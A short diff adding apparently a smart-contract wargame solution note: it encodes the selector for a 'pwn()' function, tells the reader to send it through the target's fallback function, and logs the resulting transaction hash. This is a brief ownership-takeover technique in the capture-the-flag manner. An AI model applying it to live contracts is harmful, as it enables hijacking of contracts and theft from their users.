@@ -1,0 +1,6 @@
+web3.eth.abi.encodeFunctionSignature("pwn()")
+
+use this conde and call the fallback function with the code this function gave 
+
+Transaction Hash:
+0x76410fdf9e0e4bd86c0858307c1e7eb5439742b46c95c1d29c4e09b492a28020
